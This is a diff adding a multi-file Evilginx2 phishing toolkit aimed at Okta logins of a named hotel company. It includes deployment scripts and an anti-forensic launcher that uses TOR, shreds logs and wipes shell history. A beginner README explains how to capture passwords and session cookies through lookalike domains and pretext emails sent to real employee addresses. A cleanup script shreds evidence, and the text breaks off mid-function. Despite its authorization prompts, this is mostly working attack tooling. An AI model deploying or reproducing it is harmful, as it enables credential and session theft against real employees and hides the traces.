@@ -1,0 +1,2818 @@
+Evilginx2 v3.4.1 (Stand Alone)
+
+deploy.sh
+#!/bin/bash
+# === EVILGINX2 OPSEC LAUNCHER (ENTERPRISE EDITION) ===
+# Features: Encrypted RAM disk, Automatic TOR failover, Zero forensic evidence
+# Version: Evilginx2-compatible | Tested on v2.4+
+
+set -eo pipefail
+exec 3>&1 > >(tee -a /var/log/evilginx/launcher.log) 2>&1
+
+### === OPSEC CONFIGURATION ===
+export OPSEC_ROOT="$HOME/.evilginx"
+export ENCRYPTED_LIVE="$OPSEC_ROOT/.secure"
+export TMPFS_SIZE="512M"  # Increased for session storage
+export CIPHER="aes-256-xts"
+export HASH="sha512"
+export KDF_ITER="500000"
+export LUKS_HEADER="$OPSEC_ROOT/.luks_header"
+export TOR_FALLBACK=true
+export CLEAR_LOGS_INTERVAL=3600  # 1 hour log rotation
+
+### === SECURE UTILITIES ===
+generate_key() {
+  head -c 32 /dev/urandom | base64 | tr -d '\n' > "$ENCRYPTED_LIVE/.master.key"
+  chmod 600 "$ENCRYPTED_LIVE/.master.key"
+}
+
+secure_mount() {
+  # Initialize encrypted workspace
+  if ! mountpoint -q "$ENCRYPTED_LIVE"; then
+    log "🔒 Initializing encrypted workspace"
+    
+    mkdir -p "$ENCRYPTED_LIVE"
+    if [[ ! -f "$LUKS_HEADER" ]]; then
+      dd if=/dev/urandom of="$LUKS_HEADER" bs=1M count=64 status=none
+    fi
+
+    loop_dev=$(losetup -f --show "$LUKS_HEADER")
+    trap 'losetup -d "$loop_dev"' EXIT
+
+    echo -n "$(cat "$ENCRYPTED_LIVE/.master.key")" | cryptsetup -q \
+      --cipher "$CIPHER" \
+      --hash "$HASH" \
+      --iter-time "$KDF_ITER" \
+      luksFormat "$loop_dev" -
+
+    echo -n "$(cat "$ENCRYPTED_LIVE/.master.key")" | cryptsetup -q \
+      open "$loop_dev" evilginx_secure -
+
+    mkfs.ext4 -q /dev/mapper/evilginx_secure
+    mount -t tmpfs -o size=$TMPFS_SIZE tmpfs "$ENCRYPTED_LIVE"
+    mount /dev/mapper/evilginx_secure "$ENCRYPTED_LIVE"
+
+    log "✅ Encrypted workspace mounted"
+  fi
+}
+
+### === EVILGINX CONFIGURATION ===
+configure_evilginx() {
+  local domain ip
+
+  # Load or prompt for configuration
+  if [[ -f "$OPSEC_ROOT/.last_config" ]]; then
+    source "$OPSEC_ROOT/.last_config"
+  fi
+
+  read -rp "🌐 Domain [$LAST_DOMAIN]: " domain
+  export DOMAIN="${domain:-$LAST_DOMAIN}"
+
+  if [[ "$TOR_FALLBACK" = true ]] && ! systemctl is-active --quiet tor; then
+    log "⚠️  TOR not active - using direct connection"
+    ip=$(curl --socks5-hostname 127.0.0.1:9050 -s ifconfig.me || curl -s ifconfig.me)
+  else
+    ip=$(curl -s ifconfig.me)
+  fi
+
+  read -rp "🌍 External IP [$ip]: " input_ip
+  export IP="${input_ip:-$ip}"
+
+  # Save config
+  cat > "$OPSEC_ROOT/.last_config" <<EOF
+LAST_DOMAIN="$DOMAIN"
+LAST_IP="$IP"
+EOF
+
+  # Initialize directories
+  mkdir -p "$ENCRYPTED_LIVE"/{phishlets,sessions,auth_tokens}
+  
+  # Configure Evilginx2
+  evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "config domain $DOMAIN"
+  evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "config ip $IP"
+}
+
+### === PHISHLET MANAGEMENT ===
+select_phishlet() {
+  # Get available phishlets
+  mapfile -t PHISHLETS < <(evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "phishlets" | \
+    awk '/^\| [a-z]/ {print $2}')
+
+  # Display menu
+  echo -e "\n📜 Available Phishlets:\n"
+  for i in "${!PHISHLETS[@]}"; do
+    printf "%2d) %s\n" $((i+1)) "${PHISHLETS[i]}"
+  done
+
+  # Prompt for selection
+  while true; do
+    read -rp "📌 Select phishlet to enable [1-${#PHISHLETS[@]}]: " choice
+    if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#PHISHLETS[@]} )); then
+      export PHISHLET="${PHISHLETS[choice-1]}"
+      break
+    fi
+  done
+
+  # Configure hostname
+  read -rp "📎 Hostname for $PHISHLET [login.$DOMAIN]: " hostname
+  export HOSTNAME="${hostname:-login.$DOMAIN}"
+
+  evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "phishlets hostname $PHISHLET $HOSTNAME"
+  evilginx -p "$ENCRYPTED_LIVE/phishlets" -c "phishlets enable $PHISHLET"
+}
+
+### === LOG MANAGEMENT ===
+start_log_cleaner() {
+  (while true; do
+    sleep $CLEAR_LOGS_INTERVAL
+    find "$ENCRYPTED_LIVE" -type f -name "*.log" -exec shred -u {} +
+  done) &
+}
+
+### === MAIN EXECUTION ===
+# Initialize environment
+mkdir -p "$OPSEC_ROOT"
+generate_key
+secure_mount
+
+# Configure Evilginx2
+configure_evilginx
+select_phishlet
+
+# Start background services
+start_log_cleaner
+
+log "🚀 Evilginx2 operational at https://$HOSTNAME"
+log "🔐 All session data encrypted in RAM"
+
+# Secure shell history
+shred -u ~/.bash_history && history -c
+
+
+deploy_infrastructure.sh
+#!/bin/bash
+# === EVILGINX2 INFRASTRUCTURE DEPLOYMENT SCRIPT ===
+# For authorized red team testing - Wyndham Properties
+# Sets up phishing infrastructure with security hardening
+
+set -euo pipefail
+IFS=$'\n\t'
+
+### === CONFIG ===
+source ./config.conf 2>/dev/null || {
+    echo "Error: config.conf not found. Please configure your settings first."
+    exit 1
+}
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+### === COLORS ===
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+NC='\033[0m'
+
+### === FUNCTIONS ===
+log() { echo -e "${BLUE}[DEPLOY]${NC} $*"; }
+success() { echo -e "${GREEN}[✓]${NC} $*"; }
+warning() { echo -e "${YELLOW}[!]${NC} $*"; }
+error() { echo -e "${RED}[✗]${NC} $*"; }
+phase() { echo -e "${PURPLE}[PHASE]${NC} $*"; }
+
+print_banner() {
+    echo -e "${GREEN}"
+    cat << "EOF"
+    🚀 INFRASTRUCTURE DEPLOYMENT
+    Wyndham Properties Authorized Testing
+EOF
+    echo -e "${NC}"
+}
+
+check_root() {
+    if [[ $EUID -eq 0 ]]; then
+        warning "Running as root. This is required for some operations."
+    else
+        error "Some operations require root privileges. Consider running with sudo."
+    fi
+}
+
+check_prerequisites() {
+    phase "Checking Prerequisites"
+    
+    local missing=()
+    
+    # Check required commands
+    command -v curl >/dev/null 2>&1 || missing+=("curl")
+    command -v dig >/dev/null 2>&1 || missing+=("dig")
+    command -v iptables >/dev/null 2>&1 || missing+=("iptables")
+    command -v ufw >/dev/null 2>&1 || missing+=("ufw")
+    
+    # Check Evilginx2
+    if [ ! -f "$EVILGINX_PATH/evilginx" ]; then
+        missing+=("evilginx2")
+    fi
+    
+    # Check phishlet
+    if [ ! -f "./phishlets_okta.yaml" ]; then
+        missing+=("okta phishlet")
+    fi
+    
+    if [ ${#missing[@]} -gt 0 ]; then
+        error "Missing prerequisites:"
+        printf '  • %s\n' "${missing[@]}"
+        exit 1
+    fi
+    
+    success "All prerequisites satisfied"
+}
+
+verify_authorization() {
+    phase "Authorization Verification"
+    
+    warning "CRITICAL: This script is for AUTHORIZED testing only!"
+    echo ""
+    echo "Target: $TARGET_DOMAIN"
+    echo "Campaign: $CAMPAIGN_NAME"
+    echo "Phishing Domain: $PHISHING_DOMAIN"
+    echo ""
+    
+    read -p "Do you have written authorization from Wyndham Properties? (YES/no): " auth
+    if [[ ! "$auth" == "YES" ]]; then
+        error "Explicit authorization required. Exiting."
+        exit 1
+    fi
+    
+    if [[ "$PHISHING_DOMAIN" == "your-domain.com" ]]; then
+        error "Please configure your actual phishing domain in config.conf"
+        exit 1
+    fi
+    
+    success "Authorization verified"
+}
+
+setup_firewall() {
+    phase "Configuring Firewall"
+    
+    if [[ "$ENABLE_IPTABLES" == "true" ]]; then
+        log "Setting up iptables rules..."
+        
+        # Flush existing rules
+        iptables -F
+        iptables -X
+        iptables -t nat -F
+        iptables -t nat -X
+        
+        # Default policies
+        iptables -P INPUT DROP
+        iptables -P FORWARD DROP
+        iptables -P OUTPUT ACCEPT
+        
+        # Allow loopback
+        iptables -A INPUT -i lo -j ACCEPT
+        iptables -A OUTPUT -o lo -j ACCEPT
+        
+        # Allow established connections
+        iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+        
+        # Allow specified ports
+        IFS=',' read -ra PORTS <<< "$ALLOWED_PORTS"
+        for port in "${PORTS[@]}"; do
+            iptables -A INPUT -p tcp --dport "$port" -j ACCEPT
+            log "Opened port $port"
+        done
+        
+        # Rate limiting for HTTP/HTTPS
+        if [[ "$RATE_LIMIT" == "true" ]]; then
+            iptables -A INPUT -p tcp --dport 80 -m limit --limit "$MAX_REQUESTS_PER_MINUTE"/minute -j ACCEPT
+            iptables -A INPUT -p tcp --dport 443 -m limit --limit "$MAX_REQUESTS_PER_MINUTE"/minute -j ACCEPT
+            log "Rate limiting enabled: $MAX_REQUESTS_PER_MINUTE req/min"
+        fi
+        
+        # Save rules
+        iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
+        
+        success "Firewall configured"
+    else
+        warning "Firewall configuration skipped (disabled in config)"
+    fi
+}
+
+deploy_phishlet() {
+    phase "Deploying Okta Phishlet"
+    
+    # Copy phishlet to Evilginx directory
+    cp "./phishlets_okta.yaml" "$EVILGINX_PATH/phishlets/okta.yaml"
+    success "Phishlet copied to $EVILGINX_PATH/phishlets/"
+    
+    # Copy HTML lure
+    mkdir -p "$EVILGINX_PATH/lures"
+    cp "./okta.html" "$EVILGINX_PATH/lures/"
+    success "HTML lure copied"
+    
+    log "Phishlet deployment completed"
+}
+
+configure_evilginx() {
+    phase "Configuring Evilginx2"
+    
+    # Create Evilginx config commands
+    cat > "/tmp/evilginx_setup.txt" << EOF
+config domain $PHISHING_DOMAIN
+config ipv4 external $(curl -s ifconfig.me)
+phishlets hostname okta $PHISHING_DOMAIN
+phishlets enable okta
+lures create okta
+lures get-url 0
+EOF
+    
+    success "Evilginx configuration prepared"
+    warning "Run the following commands in Evilginx2 console:"
+    echo ""
+    cat /tmp/evilginx_setup.txt
+    echo ""
+    warning "Start Evilginx2 with: sudo $EVILGINX_PATH/evilginx"
+}
+
+setup_logging() {
+    phase "Setting up Logging"
+    
+    # Create logs directory
+    mkdir -p "./logs"
+    
+    # Setup log rotation
+    cat > "/etc/logrotate.d/evilginx_campaign" << EOF
+$SCRIPT_DIR/logs/*.log {
+    daily
+    rotate 7
+    compress
+    delaycompress
+    missingok
+    notifempty
+    create 644 root root
+}
+EOF
+    
+    success "Logging configured"
+}
+
+create_monitoring_script() {
+    phase "Creating Monitoring Script"
+    
+    cat > "./monitor_campaign.sh" << 'EOF'
+#!/bin/bash
+# Campaign Monitoring Script
+
+EVILGINX_LOG="/opt/evilginx/logs"
+CAMPAIGN_LOG="./logs/campaign_monitor.log"
+
+monitor_sessions() {
+    echo "$(date): Checking for new sessions..." >> "$CAMPAIGN_LOG"
+    
+    if [ -f "$EVILGINX_LOG/sessions.log" ]; then
+        tail -n 10 "$EVILGINX_LOG/sessions.log" >> "$CAMPAIGN_LOG"
+    fi
+    
+    if [ -f "$EVILGINX_LOG/creds.log" ]; then
+        local cred_count=$(wc -l < "$EVILGINX_LOG/creds.log")
+        echo "$(date): Total credentials captured: $cred_count" >> "$CAMPAIGN_LOG"
+    fi
+}
+
+# Run monitoring
+monitor_sessions
+EOF
+    
+    chmod +x "./monitor_campaign.sh"
+    success "Monitoring script created"
+}
+
+display_next_steps() {
+    phase "Deployment Complete"
+    
+    cat << EOF
+
+🎯 INFRASTRUCTURE DEPLOYMENT SUCCESSFUL
+
+Next Steps:
+1. Verify DNS configuration for $PHISHING_DOMAIN
+2. Start Evilginx2: sudo $EVILGINX_PATH/evilginx
+3. Run the configuration commands shown above
+4. Test the phishing site: https://$PHISHING_DOMAIN
+5. Customize email templates with your domain
+6. Populate targets.txt with real email addresses
+7. Launch the campaign with: ./wyndham_redteam_master.sh
+
+Campaign Files:
+✓ Configuration: config.conf
+✓ Targets: targets.txt  
+✓ Phishlet: phishlets_okta.yaml
+✓ Email Templates: generate_okta_email.sh
+✓ Monitoring: monitor_campaign.sh
+
+Security:
+✓ Firewall configured
+✓ Rate limiting enabled
+✓ Logging setup complete
+
+Remember: This is for AUTHORIZED testing only!
+
+EOF
+}
+
+### === MAIN EXECUTION ===
+main() {
+    print_banner
+    check_root
+    verify_authorization
+    check_prerequisites
+    setup_firewall
+    deploy_phishlet
+    configure_evilginx
+    setup_logging
+    create_monitoring_script
+    display_next_steps
+}
+
+# Handle command line arguments
+case "${1:-deploy}" in
+    "deploy")
+        main
+        ;;
+    "firewall-only")
+        print_banner
+        check_root
+        setup_firewall
+        ;;
+    "phishlet-only")
+        print_banner
+        deploy_phishlet
+        ;;
+    *)
+        echo "Usage: $0 [deploy|firewall-only|phishlet-only]"
+        exit 1
+        ;;
+esac
+
+
+BEGINNER_README.md
+# 🎓 Beginner's Guide to Evilginx2 Phishing Toolkit
+
+## 📚 What Is This?
+
+This is a **supervised learning toolkit** for understanding how phishing attacks work. You'll be learning to use Evilginx2, which is a tool that creates fake websites that look exactly like real login pages (like Okta, Gmail, etc.) to capture usernames and passwords.
+
+**🚨 SUPER IMPORTANT:** This is for **authorized training only**. You must have written permission before using this on any real company. Using this without permission is illegal and can get you in serious trouble!
+
+## 🤔 How Does Phishing Work? (Simple Explanation)
+
+Think of it like this:
+1. **Real website**: `okta.com` (where people normally log in)
+2. **Fake website**: `okta-security.com` (looks identical but steals passwords)
+3. **Email trick**: Send emails that look like they're from IT saying "click here to verify your account"
+4. **Victim clicks**: They go to your fake site instead of the real one
+5. **Password stolen**: When they type their password, you capture it
+6. **Forward to real site**: They get logged into the real site, so they don't suspect anything
+
+## 🎮 The Easy Way: Using the Master Controller
+
+Good news! You don't need to understand everything at once. We've built an **automated controller** that walks you through each step.
+
+### Step 1: Start the Master Controller
+
+```bash
+# Make the script runnable
+chmod +x wyndham_redteam_master.sh
+
+# Start the easy menu system
+./wyndham_redteam_master.sh
+```
+
+This script will show you a menu like this:
+```
+🎮 CAMPAIGN CONTROL MENU
+
+1) Run Reconnaissance
+2) Setup Infrastructure 
+3) Generate Email Templates
+4) Show Pre-Launch Checklist
+5) View Campaign Status
+6) Exit
+```
+
+Just pick a number and press Enter!
+
+## 📁 What Each File Does (In Simple Terms)
+
+### 🎯 Main Controller Files
+- **`wyndham_redteam_master.sh`** - The "easy button" that guides you through everything
+- **`config.conf`** - Settings file (like your WiFi password file, but for phishing)
+- **`targets.txt`** - List of email addresses you want to target
+
+### 🛠️ Setup and Deployment
+- **`deploy_infrastructure.sh`** - Sets up your fake website automatically
+- **`cleanup_campaign.sh`** - Cleans up everything when you're done
+
+### 📧 Email Creation
+- **`generate_okta_email.sh`** - Creates realistic-looking phishing emails
+- **`okta.html`** - The fake login page that steals passwords
+
+### 🕵️ Intelligence Gathering
+- **`recon_wyndham.sh`** - Finds information about the target company
+- **`launch_okta_campaign.sh`** - Actually starts the phishing attack
+
+### 📊 Monitoring and Logs
+- **`logs_sessions.log`** - Records everyone who fell for the trick
+- **`phishlets_okta.yaml`** - Instructions for how to copy Okta's website
+
+## 🎯 Complete Beginner Walkthrough
+
+### Phase 1: Configuration (5 minutes)
+1. **Open the config file**: `nano config.conf`
+2. **Change these settings**:
+   - `PHISHING_DOMAIN="your-domain.com"` → Put your actual domain here
+   - `SMTP_SERVER="your-smtp-server"` → Your email server
+   - `SMTP_USER="your-username"` → Your email username
+   - `SMTP_PASS="your-password"` → Your email password
+
+### Phase 2: Run Reconnaissance (10 minutes)
+```bash
+./wyndham_redteam_master.sh
+# Choose option 1: Run Reconnaissance
+```
+
+**What this does:**
+- Finds all websites owned by the target company
+- Discovers email patterns (like firstname.lastname@company.com)
+- Looks for employees on LinkedIn
+- Creates a report of what it found
+
+### Phase 3: Set Up Your Fake Website (15 minutes)
+```bash
+# Choose option 2: Setup Infrastructure
+```
+
+**What this does:**
+- Installs the fake Okta website
+- Sets up SSL certificates (so it shows the lock icon)
+- Configures firewall rules
+- Makes sure everything looks legitimate
+
+### Phase 4: Create Phishing Emails (10 minutes)
+```bash
+# Choose option 3: Generate Email Templates
+```
+
+**What this does:**
+- Creates 3 types of scary emails:
+  - "Suspicious login detected!"
+  - "Your password needs to be reset!"
+  - "You must set up 2-factor authentication!"
+
+### Phase 5: Add Your Targets (5 minutes)
+Edit the file `targets.txt` and add email addresses like this:
+```
+john.smith@wyndhamhotels.com,John,Smith,IT Director,IT,HIGH
+jane.doe@wyndhamhotels.com,Jane,Doe,Manager,HR,MEDIUM
+```
+
+### Phase 6: Test Everything (10 minutes)
+- Send yourself a test email first
+- Click on your own phishing link
+- Make sure it captures your fake password
+- Check that logs are working
+
+### Phase 7: Launch the Attack
+**⚠️ Only do this with permission!**
+```bash
+# Use the campaign launcher
+./launch_okta_campaign.sh
+```
+
+## 🔧 Common Problems and Solutions
+
+### Problem: "Permission denied"
+**Solution:** 
+```bash
+chmod +x *.sh
+```
+This makes all scripts runnable.
+
+### Problem: "Domain not found"
+**Solution:** You need to register a domain name first:
+1. Buy a domain that sounds legitimate (like `okta-security.com`)
+2. Point it to your server's IP address
+3. Update `config.conf` with your domain
+
+### Problem: "Evilginx2 not found"
+**Solution:** Install Evilginx2 first:
+```bash
+# Download and install Evilginx2
+git clone https://github.com/kgretzky/evilginx2.git
+cd evilginx2
+make
+sudo make install
+```
+
+### Problem: "Emails not sending"
+**Solution:** Check your email settings in `config.conf`:
+- Make sure SMTP server is correct
+- Check username and password
+- Some email providers need "app passwords" instead of regular passwords
+
+### Problem: "SSL certificate errors"
+**Solution:** 
+```bash
+# Get free SSL certificates
+sudo apt install certbot
+sudo certbot certonly --standalone -d your-domain.com
+```
+
+## 📊 Understanding the Results
+
+### Session Logs
+When someone falls for your phishing attack, you'll see entries like:
+```
+[2024-01-15 14:30:22] New session: user@company.com
+[2024-01-15 14:30:45] Credentials captured: user@company.com:password123
+[2024-01-15 14:30:46] Session cookies stolen
+```
+
+### Success Metrics
+- **Click Rate**: How many people clicked your email
+- **Credential Rate**: How many people entered their password
+- **Session Rate**: How many people you can now impersonate
+
+## 🛡️ Defense Learning
+
+While you're learning to attack, also think about defense:
+
+### How to Spot Phishing (Teach others this!)
+1. **Check the URL carefully** - Is it really `okta.com` or `okta-security.com`?
+2. **Look for typos** - Real companies don't send emails with spelling mistakes
+3. **Verify independently** - If you get a security email, log in through the normal website
+4. **Check sender details** - Real emails come from official addresses
+
+### How Companies Can Protect Themselves
+1. **Employee training** - Teach people to spot phishing
+2. **Email filtering** - Block suspicious emails automatically
+3. **Multi-factor authentication** - Even if passwords are stolen, accounts stay safe
+4. **Regular testing** - Run practice phishing campaigns to find weak spots
+
+## 🎓 Learning Resources
+
+### Before You Start
+- **Cybersecurity Basics**: Learn about firewalls, SSL, DNS
+- **Linux Command Line**: You'll be using terminal commands
+- **Networking**: Understand how websites and email work
+
+### Advanced Topics (After mastering basics)
+- **Social Engineering**: Psychology of phishing attacks
+- **OSINT**: Advanced reconnaissance techniques
+- **Evilginx2 Customization**: Creating your own phishlets
+- **Post-Exploitation**: What to do after capturing credentials
+
+## ⚠️ Legal and Ethical Guidelines
+
+### ✅ ONLY USE THIS FOR:
+- **Authorized penetration testing** (with signed contracts)
+- **Educational purposes** (in controlled environments)
+- **Testing your own organization** (with management approval)
+- **Security research** (responsibly disclosed)
+
+### ❌ NEVER USE THIS FOR:
+- **Attacking random companies** without permission
+- **Personal gain** or stealing money
+- **Harassing individuals**
+- **Any illegal activities**
+
+### 📋 Before Every Test
+1. Get written authorization
+2. Define scope clearly (what you can and can't do)
+3. Set up emergency contacts
+4. Plan your cleanup procedure
+5. Document everything you do
+
+## 🆘 Emergency Procedures
+
+### If Something Goes Wrong
+1. **Stop immediately**: `./cleanup_campaign.sh`
+2. **Contact your supervisor**: Don't try to fix it alone
+3. **Document what happened**: What command did you run?
+4. **Preserve evidence**: Don't delete log files
+
+### If You Get Legal Questions
+1. **Don't panic**
+2. **Show your authorization letter**
+3. **Contact your legal team immediately**
+4. **Don't discuss details** without lawyer present
+
+## 🎯 Practice Exercises (Start Here!)
+
+### Exercise 1: Setup (Beginner)
+1. Install all prerequisites
+2. Configure your settings
+3. Run the master controller
+4. Generate email templates
+5. **Don't send anything yet!**
+
+### Exercise 2: Local Testing (Beginner)
+1. Set up a fake domain on your local network
+2. Send yourself a phishing email
+3. Try to capture your own password
+4. Verify logs are working
+
+### Exercise 3: Controlled Campaign (Intermediate)
+1. Get permission to test 5 coworkers
+2. Send them phishing emails
+3. Monitor results
+4. Create a simple report
+
+### Exercise 4: Full Campaign (Advanced)
+1. Research target company
+2. Create custom email templates
+3. Launch full campaign
+4. Analyze results and create professional report
+
+## 📞 Getting Help
+
+### When You're Stuck
+1. **Check the logs**: Most problems show up in error messages
+2. **Ask your supervisor**: They're there to help you learn
+3. **Read error messages carefully**: They usually tell you what's wrong
+4. **Search online**: But be careful about what advice you follow
+
+### Good Resources
+- **Evilginx2 GitHub**: Official documentation and examples
+- **Penetration Testing Communities**: But remember to stay legal!
+- **Cybersecurity Training**: Courses that teach ethical hacking
+
+## 🎉 Congratulations!
+
+If you've made it this far, you're learning valuable cybersecurity skills! Remember:
+
+- **Start slow** - Don't rush into complex attacks
+- **Stay legal** - Always get permission first
+- **Think defense** - Learn to attack so you can better defend
+- **Keep learning** - Cybersecurity changes constantly
+- **Be ethical** - Use your powers for good!
+
+---
+
+**Final Reminder**: This toolkit is powerful and can cause real damage if misused. Your supervisor is there to help you learn safely and legally. When in doubt, ask questions!
+
+*Happy (ethical) hacking! 🎯*
+
+
+cleanup_campaign.sh
+#!/bin/bash
+# === CAMPAIGN CLEANUP SCRIPT ===
+# For authorized red team testing - Wyndham Properties
+# Safely cleans up campaign infrastructure and data
+
+set -euo pipefail
+IFS=$'\n\t'
+
+### === CONFIG ===
+source ./config.conf 2>/dev/null || {
+    echo "Error: config.conf not found"
+    exit 1
+}
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+BACKUP_DIR="./campaign_backup_$(date +%Y%m%d_%H%M%S)"
+
+### === COLORS ===
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+NC='\033[0m'
+
+### === FUNCTIONS ===
+log() { echo -e "${BLUE}[CLEANUP]${NC} $*"; }
+success() { echo -e "${GREEN}[✓]${NC} $*"; }
+warning() { echo -e "${YELLOW}[!]${NC} $*"; }
+error() { echo -e "${RED}[✗]${NC} $*"; }
+phase() { echo -e "${PURPLE}[PHASE]${NC} $*"; }
+
+print_banner() {
+    echo -e "${RED}"
+    cat << "EOF"
+    🧹 CAMPAIGN CLEANUP
+    Wyndham Properties Red Team Exercise
+EOF
+    echo -e "${NC}"
+}
+
+confirm_cleanup() {
+    warning "CAMPAIGN CLEANUP CONFIRMATION"
+    echo ""
+    echo "This will:"
+    echo "  • Disable Evilginx2 phishlets"
+    echo "  • Backup campaign data"
+    echo "  • Clean sensitive logs"
+    echo "  • Reset firewall rules"
+    echo "  • Archive campaign files"
+    echo ""
+    echo "Campaign: $CAMPAIGN_NAME"
+    echo "Target: $TARGET_DOMAIN"
+    echo ""
+    
+    read -p "Are you sure you want to proceed? (type CLEANUP to confirm): " confirm
+    if [[ "$confirm" != "CLEANUP" ]]; then
+        log "Cleanup cancelled"
+        exit 0
+    fi
+    
+    success "Cleanup confirmed"
+}
+
+backup_campaign_data() {
+    phase "Backing Up Campaign Data"
+    
+    mkdir -p "$BACKUP_DIR"/{logs,configs,captured_data,reports}
+    
+    # Backup logs
+    if [ -d "./logs" ]; then
+        cp -r ./logs/* "$BACKUP_DIR/logs/" 2>/dev/null || true
+    fi
+    
+    # Backup Evilginx logs
+    if [ -d "$EVILGINX_PATH/logs" ]; then
+        cp -r "$EVILGINX_PATH/logs"/* "$BACKUP_DIR/captured_data/" 2>/dev/null || true
+    fi
+    
+    # Backup configuration files
+    cp config.conf "$BACKUP_DIR/configs/" 2>/dev/null || true
+    cp targets.txt "$BACKUP_DIR/configs/" 2>/dev/null || true
+    cp phishlets_okta.yaml "$BACKUP_DIR/configs/" 2>/dev/null || true
+    
+    # Backup reconnaissance data
+    if [ -d "./recon_output" ]; then
+        cp -r ./recon_output "$BACKUP_DIR/reports/" 2>/dev/null || true
+    fi
+    
+    # Backup email templates
+    if [ -d "./email_templates" ]; then
+        cp -r ./email_templates "$BACKUP_DIR/configs/" 2>/dev/null || true
+    fi
+    
+    success "Campaign data backed up to: $BACKUP_DIR"
+}
+
+stop_evilginx_services() {
+    phase "Stopping Evilginx2 Services"
+    
+    # Kill any running Evilginx processes
+    pkill -f evilginx 2>/dev/null || true
+    
+    # Wait for processes to stop
+    sleep 3
+    
+    # Force kill if still running
+    pkill -9 -f evilginx 2>/dev/null || true
+    
+    success "Evilginx2 services stopped"
+}
+
+disable_phishlets() {
+    phase "Disabling Phishlets"
+    
+    # Create cleanup commands for Evilginx
+    cat > "/tmp/evilginx_cleanup.txt" << EOF
+phishlets disable okta
+lures delete all
+sessions flush
+EOF
+    
+    warning "If Evilginx2 was running, execute these commands manually:"
+    cat /tmp/evilginx_cleanup.txt
+    
+    # Remove phishlet files
+    rm -f "$EVILGINX_PATH/phishlets/okta.yaml" 2>/dev/null || true
+    rm -rf "$EVILGINX_PATH/lures" 2>/dev/null || true
+    
+    success "Phishlets disabled and files removed"
+}
+
+clean_logs() {
+    phase "Cleaning Sensitive Logs"
+    
+    # Secure delete function
+    secure_delete() {
+        local file="$1"
+        if [ -f "$file" ]; then
+            # Overwrite with random data (if shred is available)
+            if command -v shred >/dev/null 2>&1; then
+                shred -vfz -n 3 "$file"
+            else
+                # Fallback to simple overwrite
+                dd if=/dev/urandom of="$file" bs=1M count=1 2>/dev/null || true
+                rm -f "$file"
+            fi
+        fi
+    }
+    
+    # Clean Evilginx logs
+    for log_file in "$EVILGINX_PATH/logs"/*.log; do
+        if [ -f "$log_file" ]; then
+            secure_delete "$log_file"
+        fi
+    done
+    
+    # Clean campaign logs
+    for log_file in ./logs/*.log; do
+        if [ -f "$log_file" ]; then
+            secure_delete "$log_file"
+        fi
+    done
+    
+    success "Sensitive logs securely deleted"
+}
+
+reset_firewall() {
+    phase "Resetting Firewall Rules"
+    
+    if [[ $EUID -eq 0 ]]; then
+        # Reset to default policies
+        iptables -P INPUT ACCEPT
+        iptables -P FORWARD ACCEPT
+        iptables -P OUTPUT ACCEPT
+        
+        # Flush all rules
+        iptables -F
+        iptables -X
+        iptables -t nat -F
+        iptables -t nat -X
+        
+        # Remove custom logrotate config
+        rm -f "/etc/logrotate.d/evilginx_campaign"
+        
+        success "Firewall rules reset"
+    else
+        warning "Root privileges required to reset firewall. Run: sudo iptables -F"
+    fi
+}
+
+archive_campaign() {
+    phase "Archiving Campaign Files"
+    
+    # Create final archive
+    tar -czf "${CAMPAIGN_NAME}_complete_$(date +%Y%m%d_%H%M%S).tar.gz" \
+        "$BACKUP_DIR" \
+        *.sh \
+        *.conf \
+        *.txt \
+        *.yaml \
+        *.html 2>/dev/null || true
+    
+    success "Campaign archived"
+}
+
+generate_cleanup_report() {
+    phase "Generating Cleanup Report"
+    
+    local report_file="$BACKUP_DIR/cleanup_report.md"
+    
+    cat > "$report_file" << EOF
+# Wyndham Properties Red Team Campaign Cleanup Report
+
+**Campaign:** $CAMPAIGN_NAME  
+**Target Domain:** $TARGET_DOMAIN  
+**Cleanup Date:** $(date -u +%Y-%m-%dT%H:%M:%SZ)  
+**Operator:** $(whoami)
+
+## Cleanup Actions Performed
+
+### ✅ Data Backup
+- Campaign logs backed up to: \`$BACKUP_DIR/logs\`
+- Captured credentials backed up to: \`$BACKUP_DIR/captured_data\`
+- Configuration files backed up to: \`$BACKUP_DIR/configs\`
+- Reconnaissance data backed up to: \`$BACKUP_DIR/reports\`
+
+### ✅ Infrastructure Cleanup
+- Evilginx2 services stopped
+- Okta phishlet disabled and removed
+- Lure files deleted
+- Sessions flushed
+
+### ✅ Security Cleanup
+- Sensitive logs securely deleted
+- Firewall rules reset to defaults
+- Temporary files removed
+
+### ✅ Archival
+- Complete campaign data archived
+- Backup directory: \`$BACKUP_DIR\`
+
+## Post-Cleanup Verification
+
+Verify the following items have been addressed:
+
+- [ ] Phishing domain DNS records updated/removed
+- [ ] SSL certificates revoked (if applicable)
+- [ ] Email sending infrastructure decommissioned
+- [ ] All captured credentials handled per policy
+- [ ] Incident response team notified (if applicable)
+- [ ] Final report delivered to stakeholders
+
+## Data Retention
+
+Campaign data is retained in backup directory per organizational policy:
+- Backup Location: \`$BACKUP_DIR\`
+- Retention Period: $RETENTION_DAYS days
+- Archive Format: tar.gz with compression
+
+## Notes
+
+This cleanup was performed as part of the authorized red team engagement with Wyndham Properties. All activities were conducted within the scope of the signed authorization letter.
+
+---
+*Cleanup Report Generated: $(date)*
+EOF
+    
+    success "Cleanup report generated: $report_file"
+}
+
+final_verification() {
+    phase "Final Verification"
+    
+    echo ""
+    echo "🔍 CLEANUP VERIFICATION CHECKLIST"
+    echo ""
+    
+    # Check if Evilginx is still running
+    if pgrep -f evilginx >/dev/null; then
+        warning "Evilginx2 processes still running"
+    else
+        success "No Evilginx2 processes running"
+    fi
+    
+    # Check for phishlet files
+    if [ -f "$EVILGINX_PATH/phishlets/okta.yaml" ]; then
